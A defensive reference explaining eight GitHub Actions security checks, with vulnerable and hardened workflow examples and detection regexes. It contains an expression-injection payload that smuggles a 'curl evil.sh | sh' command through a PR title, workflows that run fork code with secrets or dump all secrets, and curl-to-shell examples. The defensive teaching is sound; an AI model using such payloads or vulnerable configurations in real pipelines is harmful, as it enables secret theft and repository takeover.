# GitHub Actions Workflow Security

CI workflows run with a repository token, often with secrets, and frequently on code contributed by strangers. A single misconfigured trigger or an unescaped `${{ }}` expression hands an attacker a shell with your credentials. The 2025 `tj-actions/changed-files` and `reviewdog` compromises showed how one mutable tag in a third-party action can leak secrets from thousands of pipelines at once. This reference covers the checks behind `SA-GHA-01` .. `SA-GHA-08`, applied to `.github/workflows/*.yml` and composite actions under `.github/actions/`.

Hardened (`SECURE`) examples are the recommended remediation.

---

## Pwn Requests: `pull_request_target` + PR Head Checkout (SA-GHA-01)

`pull_request` from a fork runs with a read-only token and no secrets. `pull_request_target` runs in the context of the **base** repository with a write token and full secrets. It is safe only while it never executes code from the PR. Checking out `github.event.pull_request.head.sha` (or `.ref`) and then running `npm ci`, `make`, `pytest` etc. executes fork-controlled code with your secrets.

```yaml
# VULNERABLE: fork code runs with write token + secrets
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm test
```

```yaml
# SECURE: use pull_request for anything that runs PR code
on:
  pull_request:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

If you genuinely need `pull_request_target` (labelling, commenting), never check out the head ref, and split privileged steps into a second workflow triggered by `workflow_run` that only consumes artifacts, never code.

**Detection:** `pull_request_target[\s\S]*?ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(sha|ref)\s*\}\}`

---

## Expression Injection (SA-GHA-02)

`${{ }}` expressions are substituted **before** the shell sees the script. Anything an outsider controls (issue titles, PR titles and bodies, comment bodies, branch names via `github.head_ref`, commit messages, `workflow_dispatch` inputs) becomes shell source.

```yaml
# VULNERABLE: PR title `"; curl evil.sh | sh; echo "` runs as code
- run: echo "Title: ${{ github.event.pull_request.title }}"
- uses: actions/github-script@v7
  with:
    script: console.log("${{ github.event.comment.body }}")
```

```yaml
# SECURE: bind to an env var, reference as a shell variable (quoted)
- run: echo "Title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
- uses: actions/github-script@v7
  env:
    BODY: ${{ github.event.comment.body }}
  with:
    script: console.log(process.env.BODY)
```

Untrusted contexts (non-exhaustive): `github.event.issue.title/body`, `github.event.pull_request.title/body/head.ref/head.label/head.repo.default_branch`, `github.event.comment.body`, `github.event.review.body`, `github.event.review_comment.body`, `github.event.discussion.title/body`, `github.event.head_commit.message/author.*`, `github.event.commits[*].message/author.*`, `github.event.inputs.*`, `github.head_ref`.

**Detection:** a `run:` or `script:` block that contains one of the above expressions before the next step key. The regex is heuristic: a run script that itself contains a line starting with `env:` / `with:` / `- ` will end the match early.

---

## Unpinned Third-Party Actions (SA-GHA-03)

`uses: owner/repo@v3` resolves a **mutable** tag. Whoever controls the tag controls your pipeline. In March 2025, `tj-actions/changed-files` tags were force-pushed to a commit that dumped runner memory (and every secret in it) to the job log; every workflow pinned to a tag was affected, workflows pinned to a SHA were not.

```yaml
# VULNERABLE: tag can be moved to malicious code
- uses: tj-actions/changed-files@v45
- uses: some-org/deploy@main
```

```yaml
# SECURE: pin to the full 40-char commit SHA, keep the tag as a comment for Dependabot/Renovate
- uses: tj-actions/changed-files@ed68ef82c095e0d48ec87eccea555d944a631a4c # v46.0.5
```

Both Dependabot and Renovate update SHA pins and keep the version comment in sync. Pinning `actions/*` and `github/*` is also recommended, but the checkpoint only flags third-party owners to keep noise low. Consider also setting **Settings → Actions → Allow select actions** and **Require actions to be pinned to a full-length commit SHA**.

**Detection:** `uses:\s*(?!actions/|github/|\./|docker://)[\w.-]+/[\w./-]+@(?![0-9a-f]{40}\b)\S+`

---

## `permissions: write-all` (SA-GHA-04)

`GITHUB_TOKEN` permissions should be declared explicitly and minimally. `write-all` gives every job the ability to push code, create releases, write packages and modify security settings. Combined with any injection above, that is full repository takeover.

```yaml
# VULNERABLE
permissions: write-all
```

```yaml
# SECURE: read-only by default, elevate per job
permissions:
  contents: read
jobs:
  release:
    permissions:
      contents: write
      id-token: write   # OIDC to cloud, no long-lived secrets
```

Also set the repository/org default to **Read repository contents and packages permissions**.

**Detection:** `permissions:\s*write-all`

---

## `toJSON(secrets)` (SA-GHA-05)

Serialising the `secrets` context puts every repository and organisation secret into the step. GitHub masks known secret values in logs, but the values are still in the runner's memory, environment and any file or artifact the step writes.

```yaml
# VULNERABLE
- run: echo '${{ toJSON(secrets) }}' > secrets.json
```

```yaml
# SECURE: pass only the secrets a step needs, one at a time
- run: ./deploy.sh
  env:
    DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
```

**Detection:** `toJ[Ss][Oo][Nn]\(\s*secrets\s*\)`

---

## `ACTIONS_ALLOW_UNSECURE_COMMANDS` (SA-GHA-06)

The `::set-env::` and `::add-path::` workflow commands were disabled in 2020 (CVE-2020-15228) because any step that echoes attacker-controlled text to stdout could set environment variables (e.g. `NODE_OPTIONS`, `LD_PRELOAD`) for later steps. Setting this variable to `true` re-enables that attack surface.

```yaml
# VULNERABLE
env:
  ACTIONS_ALLOW_UNSECURE_COMMANDS: true
steps:
  - run: echo "::set-env name=FOO::bar"
```

```yaml
# SECURE: write to the environment files
- run: echo "FOO=bar" >> "$GITHUB_ENV"
- run: echo "$HOME/.local/bin" >> "$GITHUB_PATH"
```

**Detection:** `ACTIONS_ALLOW_UNSECURE_COMMANDS:\s*['"]?true`

---

## Self-Hosted Runners on Pull Request Triggers (SA-GHA-07)

GitHub-hosted runners are ephemeral VMs. A self-hosted runner is your machine, on your network, often persistent between jobs. If a `pull_request` workflow from a public repository runs there, any fork PR can execute code on that host, read the runner's cached credentials, and pivot into your network.

```yaml
# VULNERABLE (public repo)
on:
  pull_request:
jobs:
  test:
    runs-on: [self-hosted, linux]
```

```yaml
# SECURE: hosted runners for untrusted triggers, self-hosted only for trusted events
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: [self-hosted, linux]
```

If self-hosted is unavoidable for PRs: use ephemeral (`--ephemeral`) runners in isolated VMs/containers, require approval for first-time contributors (**Settings → Actions → Fork pull request workflows**), and never share runners between public and private repositories.

**Detection:** `pull_request[\s\S]*?runs-on:[\s\S]{0,80}?self-hosted`

---

## Remote Script Piped to Shell (SA-GHA-08)

`curl … | sh` executes whatever the server returns, with no integrity check, and a partial download can execute a truncated script. In CI this runs with your token and secrets on every push.

```yaml
# VULNERABLE
- run: curl -fsSL https://get.example.com/install.sh | bash
- run: wget -qO- https://get.example.com/tool.sh | sudo -E sh
```

```yaml
# SECURE: prefer a SHA-pinned setup action; otherwise download, verify, then run
- uses: astral-sh/setup-uv@bec219d24cd3e171d82865faccec33120bb574f4 # v10.1.0

# or
- run: |
    curl -fsSLo install.sh https://get.example.com/install.sh
    echo "<sha256>  install.sh" | sha256sum -c -
    bash install.sh
```

**Detection:** `(curl|wget)\s[^\n|]*\|\s*(sudo\s+(-E\s+)?)?(ba|z)?sh\b`

---

## Additional Hardening (not mechanically checked)

- **`persist-credentials: false`** on `actions/checkout` unless a later step pushes; otherwise the token sits in `.git/config` and leaks into any artifact that includes the workspace.
- **OIDC instead of long-lived cloud keys**: `id-token: write` plus `aws-actions/configure-aws-credentials`, `google-github-actions/auth`, `azure/login`.
- **Environment protection rules** with required reviewers for deploy jobs.
- **Cache poisoning**: never restore caches written by `pull_request` jobs into privileged jobs; scope cache keys by ref.
- **`workflow_run` and `issue_comment`** triggers are privileged like `pull_request_target`; apply the same rules.
- **Artifact leaks**: do not `upload-artifact` the whole workspace (`path: .`).
- **Dependabot/Renovate** for action SHA bumps; **zizmor** or **actionlint** as a dedicated linter in CI.

## References

- GitHub Docs: [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- GitHub Security Lab: "Keeping your GitHub Actions and workflows secure" parts 1-3 (pwn requests, untrusted input, `workflow_run`)
- CVE-2020-15228 (workflow command injection), CVE-2025-30066 (`tj-actions/changed-files`)
- OWASP CI/CD Security Top 10: CICD-SEC-1 (flow control), CICD-SEC-3 (dependency chain abuse), CICD-SEC-4 (poisoned pipeline execution), CICD-SEC-5 (insufficient PBAC), CICD-SEC-6 (credential hygiene)
